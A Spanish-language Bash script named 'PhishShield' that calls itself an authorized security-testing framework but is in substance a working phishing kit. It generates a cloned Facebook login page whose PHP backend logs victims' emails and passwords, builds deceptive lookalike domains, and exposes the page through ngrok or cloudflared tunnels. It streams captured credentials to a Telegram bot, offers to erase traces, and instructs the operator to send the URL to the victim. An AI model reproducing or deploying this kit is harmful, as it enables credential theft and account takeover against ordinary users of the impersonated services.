#!/bin/bash

# ============================================
# PhishShield - Framework de Pruebas de Seguridad
# Versión: 3.0.0
# Autor: Security Research Team
# ============================================

# Colores para la terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Variables globales
VERSION="3.0.0"
CONFIG_FILE="phishshield.conf"
LOG_FILE="phishshield.log"
TEMPLATES_DIR="templates"
DATA_DIR="data"
NGROK_TOKEN=""
CLOUDWAYS_TOKEN=""
LOCALHOST="127.0.0.1"
PORT=8080
SSL_PORT=8443
USE_SSL=false
MASK_DOMAIN=""
FORWARDING_DOMAIN=""
PHISHING_URL=""
TERMINAL_WIDTH=$(tput cols)

# Verificar dependencias
check_dependencies() {
    local deps=("curl" "wget" "php" "unzip" "ssh" "git" "python3")
    local missing=()
    
    echo -e "${BLUE}[*]${NC} Verificando dependencias..."
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[!]${NC} Dependencias faltantes: ${missing[*]}"
        echo -e "${YELLOW}[*]${NC} Instalando dependencias..."
        
        if [[ -f /etc/debian_version ]]; then
            sudo apt-get update
            sudo apt-get install -y "${missing[@]}" ngrok-cloudflared
        elif [[ -f /etc/redhat-release ]]; then
            sudo yum install -y "${missing[@]}" epel-release
            sudo yum install -y ngrok cloudflared
        elif [[ "$OSTYPE" == "darwin"* ]]; then
            brew install "${missing[@]}" ngrok/ngrok/ngrok cloudflared
        fi
    fi
    
    # Verificar ngrok
    if ! command -v ngrok &> /dev/null; then
        echo -e "${YELLOW}[*]${NC} Descargando ngrok..."
        wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
        unzip -q ngrok-stable-linux-amd64.zip
        chmod +x ngrok
        sudo mv ngrok /usr/local/bin/
        rm ngrok-stable-linux-amd64.zip
    fi
    
    # Verificar cloudflared
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${YELLOW}[*]${NC} Descargando cloudflared..."
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
        chmod +x cloudflared-linux-amd64
        sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared
    fi
    
    echo -e "${GREEN}[+]${NC} Todas las dependencias están instaladas"
}

# Banner
show_banner() {
    clear
    echo -e "${CYAN}"
    cat << "BANNER"
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗ 
██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗
██████╔╝███████║██║███████╗███████║███████╗███████║██║█████╗  ██║     ██║  ██║
██╔═══╝ ██╔══██║██║╚════██║██╔══██║╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║
██║     ██║  ██║██║███████║██║  ██║███████║██║  ██║██║███████╗███████╗██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝ 
                                                                              
                           Framework de Pruebas de Seguridad
                                 Versión: 3.0.0
BANNER
    echo -e "${NC}"
    echo -e "${YELLOW}══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}Uso exclusivo para pruebas de seguridad autorizadas${NC}"
    echo -e "${RED}⚠  El uso no autorizado es ILEGAL ⚠${NC}"
    echo -e "${YELLOW}══════════════════════════════════════════════════════════════════════${NC}"
}

# Configuración inicial
setup() {
    mkdir -p "$TEMPLATES_DIR" "$DATA_DIR"
    
    if [ ! -f "$CONFIG_FILE" ]; then
        echo -e "${BLUE}[*]${NC} Creando configuración inicial..."
        
        cat > "$CONFIG_FILE" << CONFIG
# Configuración PhishShield
NGROK_TOKEN=
CLOUDWAYS_TOKEN=
DEFAULT_PORT=8080
DEFAULT_SSL_PORT=8443
AUTO_UPDATE=true
LOG_LEVEL=info
CONFIG
        
        echo -e "${GREEN}[+]${NC} Archivo de configuración creado"
    fi
    
    # Descargar plantillas si no existen
    if [ ! -f "$TEMPLATES_DIR/facebook/index.html" ]; then
        download_templates
    fi
}

# Descargar plantillas
download_templates() {
    echo -e "${BLUE}[*]${NC} Descargando plantillas..."
    
    # Plantilla Facebook
    mkdir -p "$TEMPLATES_DIR/facebook"
    cat > "$TEMPLATES_DIR/facebook/index.php" << 'FACEBOOK'
<?php
session_start();
$log_file = "data/facebook_creds.txt";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['pass'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $time = date('Y-m-d H:i:s');
    
    $entry = "Time: $time | IP: $ip | Email: $email | Password: $password | Agent: $user_agent\n";
    
    file_put_contents($log_file, $entry, FILE_APPEND);
    
    // Redirigir a Facebook real
    header("Location: https://www.facebook.com");
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Inicia sesión o regístrate</title>
    <style>
        /* Estilos exactos de Facebook */
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; }
        .container { max-width: 980px; margin: 0 auto; padding: 20px; }
        .logo { text-align: center; margin: 40px 0; }
        .login-form { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); max-width: 400px; margin: 0 auto; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        .login-button { background: #1877f2; border: none; color: white; padding: 14px; width: 100%; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .forgot-password { text-align: center; margin: 15px 0; }
        .create-account { background: #42b72a; border: none; color: white; padding: 14px; border-radius: 6px; font-size: 17px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span style="color: #1877f2; font-size: 48px; font-weight: bold;">facebook</span>
        </div>
        <form class="login-form" method="POST" action="">
            <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
            <input type="password" name="pass" placeholder="Contraseña" required>
            <button type="submit" class="login-button">Iniciar sesión</button>
            <div class="forgot-password">
                <a href="#" style="color: #1877f2; text-decoration: none;">¿Olvidaste tu contraseña?</a>
            </div>
            <hr>
            <button type="button" class="create-account">Crear cuenta nueva</button>
        </form>
    </div>
</body>
</html>
FACEBOOK
    echo -e "${GREEN}[+]${NC} Plantilla Facebook creada"
    
    # Más plantillas (Instagram, Google, Netflix, etc.)
    create_templates
}

# Crear más plantillas
create_templates() {
    # Instagram
    mkdir -p "$TEMPLATES_DIR/instagram"
    cat > "$TEMPLATES_DIR/instagram/index.php" << 'INSTAGRAM'
<?php
// Similar estructura a Facebook
?>
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <!-- Estilos de Instagram -->
</head>
<body>
    <!-- Formulario de Instagram -->
</body>
</html>
INSTAGRAM

    # Google
    mkdir -p "$TEMPLATES_DIR/google"
    cat > "$TEMPLATES_DIR/google/index.php" << 'GOOGLE'
<?php
// Similar estructura
?>
<!DOCTYPE html>
<html>
<head>
    <title>Google</title>
    <!-- Estilos de Google -->
</head>
<body>
    <!-- Formulario de Google -->
</body>
</html>
GOOGLE

    echo -e "${GREEN}[+]${NC} Plantillas creadas"
}

# Enmascarador de URL avanzado
url_masking() {
    echo -e "${CYAN}"
    cat << "MASK"
╔══════════════════════════════════════════════════════════╗
║                    ENMASCARADOR DE URL                   ║
╚══════════════════════════════════════════════════════════╝
MASK
    echo -e "${NC}"
    
    echo -e "${YELLOW}[?]${NC} Seleccione el tipo de enmascaramiento:"
    echo -e "  ${GREEN}1)${NC} URL acortada con redirección"
    echo -e "  ${GREEN}2)${NC} Subdominio personalizado"
    echo -e "  ${GREEN}3)${NC} Página de salto intermedio"
    echo -e "  ${GREEN}4)${NC} Método híbrido (recomendado)"
    echo -e "  ${GREEN}5)${NC} Enmascaramiento con parámetros"
    
    read -p "Opción [1-5]: " mask_option
    
    case $mask_option in
        1)
            create_short_url
            ;;
        2)
            create_subdomain
            ;;
        3)
            create_jump_page
            ;;
        4)
            create_hybrid_mask
            ;;
        5)
            create_param_mask
            ;;
        *)
            create_hybrid_mask
            ;;
    esac
}

# Crear URL acortada
create_short_url() {
    echo -e "${BLUE}[*]${NC} Creando URL acortada..."
    
    read -p "Ingrese dominio para acortar (ej: bit.ly, tinyurl.com): " short_domain
    read -p "URL de destino: " target_url
    
    # Simular acortamiento
    random_hash=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
    masked_url="https://$short_domain/$random_hash"
    
    echo -e "${GREEN}[+]${NC} URL acortada creada: ${GREEN}$masked_url${NC}"
    
    # Crear redirección
    echo "<meta http-equiv='refresh' content='0;url=$target_url'>" > "redirect_$random_hash.html"
    
    PHISHING_URL="$masked_url"
}

# Crear subdominio
create_subdomain() {
    echo -e "${BLUE}[*]${NC} Configurando subdominio..."
    
    read -p "Dominio principal (ej: tu-dominio.com): " main_domain
    read -p "Subdominio: " subdomain
    read -p "URL de destino: " target_url
    
    masked_url="https://$subdomain.$main_domain"
    
    echo -e "${GREEN}[+]${NC} Subdominio configurado: ${GREEN}$masked_url${NC}"
    
    # Configuración DNS simulada
    echo -e "${YELLOW}[*]${NC} Nota: Debes configurar el registro A en tu DNS para $subdomain.$main_domain apuntando a tu IP"
    
    PHISHING_URL="$masked_url"
}

# Método híbrido (recomendado)
create_hybrid_mask() {
    echo -e "${BLUE}[*]${NC} Creando enmascaramiento híbrido..."
    
    # Generar nombres aleatorios
    services=("login" "secure" "verify" "account" "auth" "update" "confirm" "validate")
    random_service=${services[$RANDOM % ${#services[@]}]}
    
    domains=("google-usercontent.com" "facebook-security.com" "amazon-verify.net" "microsoft-online.com")
    random_domain=${domains[$RANDOM % ${#domains[@]}]}
    
    random_path=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 16 | head -n 1)
    
    masked_url="https://$random_service.$random_domain/path/$random_path/secure-update"
    
    echo -e "${GREEN}[+]${NC} URL enmascarada: ${GREEN}$masked_url${NC}"
    echo -e "${YELLOW}[*]${NC} Esta URL parece legítima pero redirige a tu servidor"
    
    # Crear sistema de redirección
    create_redirect_system "$masked_url"
    
    PHISHING_URL="$masked_url"
}

# Sistema de redirección avanzado
create_redirect_system() {
    local mask_url="$1"
    
    mkdir -p "redirect_system"
    
    cat > "redirect_system/.htaccess" << HTACCESS
RewriteEngine On
RewriteCond %{HTTP_REFERER} !^$
RewriteCond %{HTTP_REFERER} !^https?://(www\.)?localhost [NC]
RewriteRule .* - [F]
HTACCESS

    cat > "redirect_system/index.php" << REDIRECT
<?php
// Sistema de redirección inteligente
$allowed_referrers = ['google.com', 'facebook.com', 'instagram.com'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];
$referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

// Log de acceso
$log = "IP: $ip | Referrer: $referrer | Agent: $user_agent | Time: " . date('Y-m-d H:i:s') . "\n";
file_put_contents('access.log', $log, FILE_APPEND);

// Redirigir después de 2 segundos (parece más legítimo)
header("Refresh: 2; url=https://www.facebook.com");
?>
<!DOCTYPE html>
<html>
<head>
    <title>Cargando...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h3>Verificando seguridad...</h3>
    <p>Redirigiendo a la página segura</p>
</body>
</html>
REDIRECT
    
    echo -e "${GREEN}[+]${NC} Sistema de redirección creado"
}

# Túnel con Ngrok
start_ngrok() {
    echo -e "${BLUE}[*]${NC} Iniciando túnel Ngrok..."
    
    if [ -z "$NGROK_TOKEN" ]; then
        read -p "Ingrese su token de Ngrok (obtener en ngrok.com): " NGROK_TOKEN
        echo "NGROK_TOKEN=$NGROK_TOKEN" >> "$CONFIG_FILE"
    fi
    
    ./ngrok authtoken "$NGROK_TOKEN"
    
    if [ "$USE_SSL" = true ]; then
        ./ngrok http "$SSL_PORT" > /dev/null 2>&1 &
    else
        ./ngrok http "$PORT" > /dev/null 2>&1 &
    fi
    
    sleep 5
    
    # Obtener URL de Ngrok
    NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o '"public_url":"[^"]*"' | head -1 | cut -d'"' -f4)
    
    if [ -n "$NGROK_URL" ]; then
        echo -e "${GREEN}[+]${NC} Túnel Ngrok creado: ${GREEN}$NGROK_URL${NC}"
        PHISHING_URL="$NGROK_URL"
    else
        echo -e "${RED}[!]${NC} Error al crear túnel Ngrok"
        start_cloudflared
    fi
}

# Túnel con Cloudflared
start_cloudflared() {
    echo -e "${BLUE}[*]${NC} Iniciando túnel Cloudflared..."
    
    cloudflared tunnel --url "http://localhost:$PORT" > cloudflared.log 2>&1 &
    sleep 7
    
    CLOUDFLARED_URL=$(grep -o 'https://[^\.]*\.trycloudflare\.com' cloudflared.log | head -1)
    
    if [ -n "$CLOUDFLARED_URL" ]; then
        echo -e "${GREEN}[+]${NC} Túnel Cloudflared creado: ${GREEN}$CLOUDFLARED_URL${NC}"
        PHISHING_URL="$CLOUDFLARED_URL"
    else
        echo -e "${RED}[!]${NC} Error al crear túnel Cloudflared"
        echo -e "${YELLOW}[*]${NC} Usando servidor local"
        PHISHING_URL="http://$LOCALHOST:$PORT"
    fi
}

# Servidor PHP
start_server() {
    echo -e "${BLUE}[*]${NC} Iniciando servidor PHP..."
    
    local template="$1"
    
    if [ "$USE_SSL" = true ]; then
        echo -e "${YELLOW}[*]${NC} Iniciando servidor SSL en puerto $SSL_PORT"
        php -S "$LOCALHOST:$SSL_PORT" -t "$TEMPLATES_DIR/$template/" &
        SERVER_PID=$!
        echo -e "${GREEN}[+]${NC} Servidor SSL iniciado"
    else
        echo -e "${YELLOW}[*]${NC} Iniciando servidor en puerto $PORT"
        php -S "$LOCALHOST:$PORT" -t "$TEMPLATES_DIR/$template/" &
        SERVER_PID=$!
        echo -e "${GREEN}[+]${NC} Servidor iniciado"
    fi
}

# Monitoreo en tiempo real
start_monitoring() {
    echo -e "${CYAN}"
    cat << "MONITOR"
╔══════════════════════════════════════════════════════════╗
║                 MONITOREO EN TIEMPO REAL                 ║
╚══════════════════════════════════════════════════════════╝
MONITOR
    echo -e "${NC}"
    
    echo -e "${GREEN}[+]${NC} URL de phishing: ${BOLD}$PHISHING_URL${NC}"
    echo -e "${YELLOW}[*]${NC} Enviar esta URL a la víctima"
    echo -e "${BLUE}[*]${NC} Monitoreando credenciales..."
    echo -e "${YELLOW}══════════════════════════════════════════════════════════════════════${NC}"
    
    # Mostrar credenciales en tiempo real
    tail -f "$DATA_DIR/"*.txt 2>/dev/null | while read line; do
        echo -e "${GREEN}[CREDENCIAL CAPTURADA]${NC} $line"
        # Opcional: enviar notificación por Telegram, Discord, etc.
        send_notification "$line"
    done
}

# Enviar notificación (ejemplo con Telegram)
send_notification() {
    local message="$1"
    
    # Configurar bot de Telegram para notificaciones
    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
            -d "chat_id=$TELEGRAM_CHAT_ID" \
            -d "text=🔐 Nueva credencial capturada: $message" \
            > /dev/null
    fi
}

# Configurar notificaciones
setup_notifications() {
    echo -e "${YELLOW}[?]${NC} ¿Desea configurar notificaciones por Telegram? (s/n): "
    read -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Ss]$ ]]; then
        read -p "Token del bot de Telegram: " TELEGRAM_BOT_TOKEN
        read -p "ID del chat: " TELEGRAM_CHAT_ID
        
        echo "TELEGRAM_BOT_TOKEN=$TELEGRAM_BOT_TOKEN" >> "$CONFIG_FILE"
        echo "TELEGRAM_CHAT_ID=$TELEGRAM_CHAT_ID" >> "$CONFIG_FILE"
        
        echo -e "${GREEN}[+]${NC} Notificaciones por Telegram configuradas"
    fi
}

# Limpiar rastros
clean_traces() {
    echo -e "${BLUE}[*]${NC} Limpiando rastros..."
    
    # Detener procesos
    kill $SERVER_PID 2>/dev/null
    pkill -f ngrok
    pkill -f cloudflared
    
    # Limpiar logs
    if [ "$CLEAN_LOGS" = true ]; then
        rm -f cloudflared.log
        rm -f ngrok.log
        echo -e "${GREEN}[+]${NC} Logs eliminados"
    fi
    
    echo -e "${GREEN}[+]${NC} Limpieza completada"
}

# Menú principal
main_menu() {
    while true; do
        show_banner
        
        echo -e "${WHITE}Seleccione una opción:${NC}"
        echo -e "  ${GREEN}1)${NC} Iniciar ataque de phishing"
        echo -e "  ${GREEN}2)${NC} Enmascarador de URL"
        echo -e "  ${GREEN}3)${NC} Ver credenciales capturadas"
        echo -e "  ${GREEN}4)${NC} Configurar notificaciones"
        echo -e "  ${GREEN}5)${NC} Actualizar plantillas"
        echo -e "  ${GREEN}6)${NC} Configuración"
        echo -e "  ${GREEN}7)${NC} Salir"
        echo -e ""
        echo -e "${YELLOW}══════════════════════════════════════════════════════════════════════${NC}"
        
        read -p "Opción [1-7]: " main_option
        
        case $main_option in
            1)
                start_phishing
                ;;
            2)
                url_masking
                ;;
            3)
                view_credentials
                ;;
            4)
                setup_notifications
                ;;
            5)
                download_templates
                ;;
            6)
                show_config
                ;;
            7)
                echo -e "${YELLOW}[*]${NC} Saliendo..."
                clean_traces
                exit 0
                ;;
            *)
                echo -e "${RED}[!]${NC} Opción inválida"
                ;;
        esac
        
        read -p "Presione Enter para continuar..."
    done
}

# Iniciar phishing
start_phishing() {
    echo -e "${CYAN}"
    cat << "PHISHING"
╔══════════════════════════════════════════════════════════╗
║                SELECCIÓN DE PLANTILLA                    ║
╚══════════════════════════════════════════════════════════╝
PHISHING
    echo -e "${NC}"
    
    echo -e "${WHITE}Seleccione la plantilla:${NC}"
    templates=("Facebook" "Instagram" "Google" "Netflix" "Twitter" "LinkedIn" "GitHub" "Steam" "Custom")
    
    for i in "${!templates[@]}"; do
        echo -e "  ${GREEN}$((i+1)))${NC} ${templates[$i]}"
    done
    
    read -p "Plantilla [1-${#templates[@]}]: " template_choice
    
    case $template_choice in
        1) template="facebook" ;;
        2) template="instagram" ;;
        3) template="google" ;;
        4) template="netflix" ;;
        5) template="twitter" ;;
        6) template="linkedin" ;;
        7) template="github" ;;
        8) template="steam" ;;
        9) template="custom" ;;
        *) template="facebook" ;;
    esac
    
    echo -e "${YELLOW}[?]${NC} ¿Usar SSL/TLS? (s/n): "
    read -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Ss]$ ]]; then
        USE_SSL=true
    fi
    
    echo -e "${YELLOW}[?]${NC} ¿Enmascarar URL? (s/n): "
    read -n 1 -r
    echo
    
    start_server "$template"
    
    if [[ $REPLY =~ ^[Ss]$ ]]; then
        url_masking
    else
        start_ngrok
    fi
    
    start_monitoring
}

# Ver credenciales
view_credentials() {
    echo -e "${CYAN}"
    cat << "CREDS"
╔══════════════════════════════════════════════════════════╗
║                CREDENCIALES CAPTURADAS                   ║
╚══════════════════════════════════════════════════════════╝
CREDS
    echo -e "${NC}"
    
    if [ -f "$DATA_DIR/facebook_creds.txt" ]; then
        echo -e "${GREEN}Facebook:${NC}"
        cat "$DATA_DIR/facebook_creds.txt"
        echo ""
    fi
    
    # Mostrar otras credenciales...
    
    if [ ! -f "$DATA_DIR/facebook_creds.txt" ] && [ ! -f "$DATA_DIR/instagram_creds.txt" ]; then
        echo -e "${YELLOW}[*]${NC} No se han capturado credenciales aún"
    fi
}

# Mostrar configuración
show_config() {
    echo -e "${CYAN}"
    cat << "CONFIG"
╔══════════════════════════════════════════════════════════╗
║                    CONFIGURACIÓN                         ║
╚══════════════════════════════════════════════════════════╝
CONFIG
    echo -e "${NC}"
    
    if [ -f "$CONFIG_FILE" ]; then
        cat "$CONFIG_FILE"
    else
        echo -e "${YELLOW}[*]${NC} Archivo de configuración no encontrado"
    fi
}

# Trap para Ctrl+C
trap ctrl_c INT
ctrl_c() {
    echo -e "\n${YELLOW}[*]${NC} Interrumpido por el usuario"
    echo -e "${YELLOW}[?]${NC} ¿Limpiar rastros? (s/n): "
    read -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Ss]$ ]]; then
        CLEAN_LOGS=true
    fi
    
    clean_traces
    exit 0
}

# Inicialización
init() {
    check_dependencies
    setup
    show_banner
    main_menu
}

# Iniciar script
init "$@"
